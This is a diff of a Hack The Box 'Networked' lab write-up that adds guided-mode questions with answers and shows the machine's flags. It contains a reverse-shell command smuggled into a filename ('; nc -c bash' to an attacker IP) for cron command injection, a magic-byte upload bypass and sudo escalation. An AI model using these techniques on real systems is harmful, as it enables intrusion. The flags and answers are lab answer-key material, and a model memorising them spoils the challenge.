@@ -10,7 +10,8 @@
 | **Difficulty** | 🟢 Easy |
 | **OS** | 🐧 Linux |
 | **Mode** | 🧭 Guided Mode |
-| **Date** | 2026-04-28 |
+| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: Initial Foothold](#-2-initial-foothold) <br> [3: Privilege Escalation (guly)](#-3-privilege-escalation-guly) <br> [4: Privilege Escalation (root)](#-4-privilege-escalation-root) <br> [5: Pwn3d !!](#-5-pwn3d-) |
+| **Date** | 2026-04-29 |
 
 ---
 
@@ -222,6 +223,15 @@ hexcurse hi.php.png
 ![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/5.1-hexcurse.png)
 All is good..👾
 
+
+> [!NOTE]
+> 
+> MIME types protect website upload functions from uploading files that are not actually the declared file type. Magic bytes are used to bypass this by appending the bytes to the payload file. What are first eight magic bytes for PNG format? (Give your answer as 16 hex characters)
+> 
+> 89504E470D0A1A0A
+>
+
+
 Let's open a listener on port 9000 with **netcat (nc)** tool and specifying the `-l` (listen), `-v` (verbose), `-n` (numeric only, no DNS), and `-p` (port) flags:
 ```bash
 nc -lvnp 9000
@@ -309,6 +319,13 @@ foreach ($files as $key => $value) {
 * **Cronjob:** The system includes a scheduled task (Cronjob) that runs with the privileges of the user guly and executes the `check_attack.php` script every [3 minutes](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/crontab-2.png) to check the uploads folder. I can exploit this to escalate my privileges to be user guly!
 
 
+> [!NOTE]
+> 
+> On Linux operating systems, users have the ability to schedule tasks to run at a desired period of time. What is the default task scheduler in Linux?
+> 
+> cron
+
+
 So, let's open a listener on port 9999, then go back to `/var/www/html/uploads` and create my reverse shell command as a filename which will then automatically run after 3 minutes as a cron job and become guly!!💀
 
 ```bash
@@ -320,12 +337,26 @@ touch "; nc -c bash 10.10.14.34 9999"
 ![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/10-exp.png)
 
 Grab a sip of coffee and chill for a 3 minutes☕..
+Yaah.. solv these quastions also..
+
+> [!NOTE]
+> 
+> According to the backup of the crontab file for guly, the `check_attack.php` script is executed every how many minutes?
+> 
+> 3
+
+> [!NOTE]
+> 
+> In the check_attack.php script, there is one variable that can be controlled by us and is used in the call of a dangerous function. What is that variable name (including the leading $)?
+> 
+> $value
+
 
 ![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/11-guly.png)
 ![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/12-guly-flag.png)
 
 
-Here we go ! I'm guly user and got the flag, lets countinue
+Here we go! 🚀 I'm guly user and got the flag, lets countinue
 
 ---
 
@@ -377,15 +408,25 @@ sudo /usr/local/sbin/changename.sh
 
 FINALLY ! I'm root user!!💥
 
+> [!NOTE]
+> 
+> What is the name of the script that guly can run as root without a password?
+> 
+> changename.sh
+
 ---
 
-## 🏁 5: Conclusion
+## 🏁 5: Pwn3d !!
 
 
-User Flag: 72b837cf5b46d8789cf6b69882d762d6
+**User Flag: 72b837cf5b46d8789cf6b69882d762d6**
 
-Root Flag: 0b9eba9fbf03fccf8eaf76491d5f8fa2
+**Root Flag: 0b9eba9fbf03fccf8eaf76491d5f8fa2**
 
 We shouled always sanitize user input in system-level scripts, and implement strict extension whitelisting for file uploads.
+
+
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/14-pwn3d!.png)
+
 
 Created with 💜 by Reef
